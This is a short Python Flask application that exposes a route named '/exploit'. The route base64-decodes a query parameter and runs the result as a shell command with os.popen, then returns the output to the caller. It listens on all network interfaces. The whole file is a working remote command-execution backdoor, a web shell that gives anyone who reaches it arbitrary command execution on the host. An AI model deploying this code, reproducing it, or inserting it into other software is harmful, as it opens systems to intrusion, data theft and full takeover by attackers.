from flask import Flask
from flask import request
import base64
from urllib.parse import unquote
import os

app = Flask(__name__)

@app.route('/exploit', methods=['GET'])
def exploit():
    action = request.args.get("action")
    action = str(base64.b64decode(unquote(action)), 'utf-8')
    print(action)
    try:
        r = os.popen(action)
        text = r.read()
        r.close()
    except:
        return "exec fail"
    return text

if __name__ == '__main__':
    app.run(threaded=True, host="0.0.0.0", port=8001)